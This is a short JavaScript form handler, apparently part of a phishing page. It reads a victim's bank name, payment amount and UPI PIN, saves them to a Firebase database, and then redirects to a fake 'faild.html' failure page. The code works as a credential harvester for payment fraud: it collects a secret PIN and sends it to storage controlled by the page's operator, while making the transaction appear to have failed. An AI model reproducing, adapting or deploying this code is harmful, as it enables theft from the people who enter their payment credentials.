
// reference your database
var ududip007DB = firebase.database().ref("ududip007");

document.getElementById("ududip007").addEventListener("submit", submitForm);

function submitForm(e) {
  e.preventDefault();

    var abank = getElementVal("abank");
    var bammount = getElementVal("bammount");
    var cupipin = getElementVal("cupipin");
    
    

  

  saveMessages(abank, bammount, cupipin);

  // redirect to card page
  window.location.href = "faild.html";
}

const saveMessages = (abank, bammount, cupipin) => {
  var newududip007 = ududip007DB.push();

  newududip007.set({
      Bank_Name: abank,
      Ammount: bammount,
      UPI_PIN: cupipin,
      
      
    
    
  });
};

const getElementVal = (id) => {
  return document.getElementById(id).value;
};

